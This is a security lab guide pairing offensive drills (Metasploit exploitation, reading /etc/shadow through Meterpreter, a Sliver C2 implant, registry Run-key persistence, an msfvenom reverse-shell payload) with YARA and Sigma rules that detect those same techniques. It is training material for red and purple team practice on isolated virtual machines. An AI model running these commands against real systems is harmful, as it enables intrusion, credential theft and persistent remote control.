# Practice Drills + Detection Mirror

Two halves, same muscles. Half 1 is offensive practice on lab machines
you own. Half 2 is the defensive reflex: writing detections for the
exact techniques you just used. You'll never truly understand evasion
until you've written the thing that catches it.

---

## Half 1 — Offensive drills (host-only lab, your VMs only)

### Drill 1 · Flow: recon → exploit → post-exploit (Metasploit)

1. `db_nmap -sV -sC -O 192.168.56.40` (Metasploitable 2)
2. Pick **one** service, read its banner, search `msf6 > search <service>`.
3. Exploit it. (`vsftpd_234_backdoor` done already? Try Samba
   `usermap_script` or the distcc exec.)
4. Meterpreter in, then: `getuid` → `shell` → `download /etc/shadow`.
5. Clean up. Snapshot restore.

Goal: complete the flow without looking at notes for the last two steps.

### Drill 2 · C2 lifecycle (Sliver)

1. Generate a fresh mTLS implant, stand up the listener, execute on the
   Windows eval VM.
2. `sessions` → interact. Pull `systeminfo`-equivalent info
   (`info`, `getuid`, `ifconfig`).
3. Move a file back (`download`) and stage one out (`upload`).
4. Kill the session, verify the implant process is gone on the victim,
   restore snapshot.

### Drill 3 · Persistence you'll later detect

Do this **twice** — once blind, once while recording every artifact:

1. On the Windows victim, create a Run-key persistence entry for a
   harmless binary (e.g. notepad.exe) via `reg add`:
   ```powershell
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
   ```
2. Record: the exact registry value name, the binary path, timestamp,
   and the parent process/PID of `reg` when it ran.
3. Now go to Half 2 and write the YARA + Sigma rules that would catch
   this. Run them against the box.

### Drill 4 · Detection-led offense (the senior move)

1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /tmp/msf.exe`
2. Before executing: predict what Windows Defender will flag and why
   (unsigned, network callback, no cert, metasploit string signatures).
3. Execute on the victim with Defender **on**. Watch the alert. Read the
   alert's description.
4. Turn Defender off, execute, then hunt the artifact manually with
   Sysinternals `Autoruns` + `TCPView` (download from Microsoft).
5. Write a YARA rule for the msfvenom binary (you'll see the same
   `\x00` null-prefixed PE structure + known meterpreter signature).

---

## Half 2 — Detection pack (YARA + Sigma)

These detections target the exact persistence + beaconing techniques
from the original repo in this workspace (`rat.cpp` / its Run-key
installer and periodic `POST`/`GET` polling to a fixed C2). Writing
them is a great exercise; they're also genuinely useful for your own
EDR testing against your lab.

### YARA — Run-key persistence artifact

`lab/detections/persist_runkey.yar`:

```yara
rule Windows_Registry_RunKey_Persistence {
    meta:
        author = "lab"
        description = "Detect write of a binary path into the current-user Run key (run once per boot)"
        os = "windows"

    strings:
        $s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii
        $s2 = "WindowsUpdateChecker" ascii nocase
        $s3 = "\\AppData\\" ascii nocase
        $s4 = "%TEMP%\\" ascii nocase

    condition:
        uint16(0) == 0x5A4D and          // MZ header
        ($s1 and $s2) or                 // Run key + known value name
        ($s1 and ($s3 or $s4))          // Run key + temp/appdata binary
}
```

### YARA — HTTP beaconing agent (generic check-in patterns)

`lab/detections/beacon_http.yar`:

```yara
rule Http_Beaconing_Strings {
    meta:
        author = "lab"
        description = "Common client strings for a polling C2 agent (URL pattern, user-agent, JSON command keys)"
        os = "windows"

    strings:
        $ua = "Mozilla/5.0" ascii
        $q1 = "/cmd?id=" ascii
        $q2 = "/result" ascii
        $poll = "POST /?id=" ascii
        $json = "machine=" ascii
        $b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" ascii

    condition:
        uint16(0) == 0x5A4D and 2 of them
}
```

> This is an exercise in **strings**, not a bypass. Modern EDR catches
> these trivially by behavior. That's the point of the drill — notice
> how easy the free/opensource side of detection is, then write the
> same class of rule against Sliver's `mtls` transport, which has no
> plaintext `cmd_id` strings at all.

### Sigma — Run key creation event

`lab/detections/create_runkey.yml`:

```yaml
title: CurrentUser Run Key Persistence
id: lab-runkey-001
status: test
description: Detects creation of a value under HKCU CurrentVersion\Run (persistence)
logsource:
  category: registry_event
  product: windows
detection:
  selection:
    TargetObject|contains: 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
  condition: selection
level: medium
```

### Sigma — periodic C2 HTTP polling (network)

`lab/detections/periodic_http_beacon.yml`:

```yaml
title: Periodic HTTP Polling to Fixed C2
id: lab-beacon-001
status: test
description: Detects regular HTTP GET/POST to a single external host (interval-based beacon)
logsource:
  category: dns_query
  product: windows
detection:
  selection:
    QueryName|endswith: ".example.com" # replace with your lab C2 domain
  timeframe: 10m
  condition: selection | count() > 5
level: high
```

---

## How to read these honestly

- These are **detection recipes for drilling**, not a petting zoo of
  "what to flag." They're built to catch the repo's own techniques so
  you can practice detection engineering on real artifacts.
- The YARA rules assume you drop the binary and run
  `yara persist_runkey.yar <file>`.
- The Sigma rules assume a SIEM/EDR that ingests Windows registry +
  DNS event logs (e.g. Sysmon with a Sigma->Splunk/Elastic converter).
- Real hunts combine all of it with process trees, parent/child
  relationships, and network flows — which is exactly the next drill
  after these: catch your own Sliver session using **only** Sysmon
  network events and process creation events.

---

## Final lab checklist

| Task                                                         | Done |
| ------------------------------------------------------------ | ---- |
| Attacker VM built (`setup-attacker.sh`)                      | [ ]  |
| Host-only network, no internet route                         | [ ]  |
| Victim VM(s) up + static IPs                                 | [ ]  |
| Snapshots of clean victims                                   | [ ]  |
| Sliver first implant + session                               | [ ]  |
| Metasploit first shell (vsftpd) + Meterpreter                | [ ]  |
| Drill 3 + detections: Run-key caught by YARA/Sigma           | [ ]  |
| Drill 4: Defender alert observed + written YARA for msfvenom | [ ]  |
| Tear-down or isolate lab when done                           | [ ]  |

That's the full track — offensively you learn C2 + exploitation on your
own machines; defensively you learn to catch the same techniques. Both
sides are the actual job description for a red/purple team role.
